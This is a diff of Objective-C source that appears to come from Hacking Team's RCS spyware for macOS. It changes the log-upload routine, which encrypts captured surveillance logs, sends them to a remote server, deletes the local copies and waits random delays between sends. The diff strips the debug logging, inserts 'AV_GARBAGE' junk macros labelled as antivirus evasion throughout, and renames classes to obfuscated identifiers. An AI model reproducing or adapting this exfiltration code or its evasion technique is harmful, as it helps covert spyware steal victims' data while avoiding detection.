@@ -6,6 +6,7 @@
  * Copyright (C) HT srl 2011. All rights reserved
  *
  */
+#import "RCSMCommon.h"
 
 #import "LogNetworkOperation.h"
 
@@ -18,10 +19,10 @@
 #import "NSString+SHA1.h"
 #import "NSData+SHA1.h"
 
-#import "RCSMCommon.h"
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
 @interface LogNetworkOperation (private)
 
@@ -33,15 +34,13 @@
 
 - (BOOL)_sendLogContent: (NSData *)aLogData
 {
-#ifdef DEBUG_LOG_NOP
-  infoLog(@"");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   if (aLogData == nil)
     {
-#ifdef DEBUG_LOG_NOP
-      errorLog(@"aLogData is nil");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_002    
       
       return NO;
     }
@@ -54,20 +53,37 @@
   //
   NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                 length: sizeof(uint32_t)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   uint32_t dataSize             = [aLogData length];
   [commandData appendBytes: &dataSize
                     length: sizeof(uint32_t)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [commandData appendData: aLogData];
   
   NSData *commandSha            = [commandData sha1Hash];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   [commandData appendData: commandSha];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
 #ifdef DEBUG_LOG_NOP
   verboseLog(@"commandData: %@", commandData);
 #endif
   
   [commandData encryptWithKey: gSessionKey];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   //
   // Send encrypted message
@@ -76,32 +92,50 @@
   NSData *replyData             = nil;
   NSMutableData *replyDecrypted = nil;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   replyData = [mTransport sendData: commandData
                  returningResponse: urlResponse];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   if (replyData == nil)
     {
-#ifdef DEBUG_LOG_NOP
-      errorLog(@"empty reply from server");
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       [commandData release];
       [outerPool release];
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       return NO;
     }
 
   replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [replyDecrypted decryptWithKey: gSessionKey];
   
-#ifdef DEBUG_LOG_NOP
-  infoLog(@"replyDecrypted: %@", replyDecrypted);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [replyDecrypted getBytes: &command
                     length: sizeof(uint32_t)];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   // remove padding
   [replyDecrypted removePadding];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   //
   // check integrity
@@ -111,61 +145,78 @@
   
   @try
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+    
       shaRemote = [replyDecrypted subdataWithRange:
                    NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                                CC_SHA1_DIGEST_LENGTH)];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       shaLocal = [replyDecrypted subdataWithRange:
                   NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
     }
   @catch (NSException *e)
     {
-#ifdef DEBUG_LOG_NOP
-      errorLog(@"exception on sha makerange (%@)", [e reason]);
-#endif
-      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_004
       
       return NO;
     }
   
   shaLocal = [shaLocal sha1Hash];
   
-#ifdef DEBUG_LOG_NOP
-  infoLog(@"shaRemote: %@", shaRemote);
-  infoLog(@"shaLocal : %@", shaLocal);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
-#ifdef DEBUG_LOG_NOP
-      errorLog(@"sha mismatch");
-#endif
-      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_006
       
       return NO;
     }
    
   if (command != PROTO_OK)
     {
-#ifdef DEBUG_LOG_NOP
-      errorLog(@"Server issued a PROTO_%d", command);
-#endif
-      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+    
       [replyDecrypted release];
       [commandData release];
       [outerPool release];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       return NO;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   [replyDecrypted release];
   [commandData release];
   [outerPool release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   return YES;
 }
@@ -188,11 +239,14 @@
       mMaxDelay           = aMaxDelay;
       mBandwidthLimit     = aBandwidth;
       
-#ifdef DEBUG_LOG_NOP
-      infoLog(@"mTransport: %@", mTransport);
-#endif
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       return self;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   return nil;
 }
@@ -204,12 +258,11 @@
 
 - (BOOL)perform
 {
-#ifdef DEBUG_LOG_NOP
-  infoLog(@"");
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
+  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
   
   //
   // Close active logs and move them to the send queue
@@ -227,8 +280,14 @@
 #endif
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   NSEnumerator *enumerator = [logManager getSendQueueEnumerator];
   id anObject;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   if (enumerator == nil)
     {
@@ -238,6 +297,9 @@
     }
   else
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_002
+    
       //
       // Send all the logs in the send queue
       //
@@ -246,20 +308,31 @@
           [anObject retain];
           NSString *logName = [[anObject objectForKey: @"logName"] copy];
           
-#ifdef DEBUG_LOG_NOP
-          infoLog(@"Sending log: %@", logName);
-#endif
+          // AV evasion: only on release build
+          AV_GARBAGE_009
           
           if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
             {
+              // AV evasion: only on release build
+              AV_GARBAGE_008
+            
               NSData *logContent  = [NSData dataWithContentsOfFile: logName];
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_007
               
               //
               // Send log
               //
               [self _sendLogContent: logContent];
               
+              // AV evasion: only on release build
+              AV_GARBAGE_000
+              
               NSString *logPath = [[anObject objectForKey: @"logName"] retain];
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_001
               
               if ([[NSFileManager defaultManager] removeItemAtPath: logPath
                                                              error: nil] == NO)
@@ -271,13 +344,19 @@
               else
                 {
                   // decrement Quota disk
-                  [[RCSMDiskQuota sharedInstance] decUsed: [logContent length]];
+                  [[__m_MDiskQuota sharedInstance] decUsed: [logContent length]];
                 }
-                
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_002
+              
               [logPath release];
             }
             
           [logName release];
+          
+          // AV evasion: only on release build
+          AV_GARBAGE_003
           
           //
           // Remove log entry from the send queue
@@ -285,28 +364,46 @@
           [logManager removeSendLog: [[anObject objectForKey: @"agentID"] intValue]
                           withLogID: [[anObject objectForKey: @"logID"] intValue]];
           
+          // AV evasion: only on release build
+          AV_GARBAGE_004
+          
           //
           // Sleep as specified in configuration
           //
           if (mMaxDelay > 0)
             {
+              // AV evasion: only on release build
+              AV_GARBAGE_001
+            
               srand(time(NULL));
+              
+              // AV evasion: only on release build
+              AV_GARBAGE_002
+              
               int sleepTime = rand() % (mMaxDelay - mMinDelay) + mMinDelay;
               
-#ifdef DEBUG_LOG_NOP
-              infoLog(@"Sleeping %d seconds", sleepTime);
-#endif
+              // AV evasion: only on release build
+              AV_GARBAGE_002
               
               sleep(sleepTime);
             }
           else
             {
+              // AV evasion: only on release build
+              AV_GARBAGE_009
+            
               usleep(300000);
             }
         }
     }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+  
   [outerPool release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   return YES;
 }
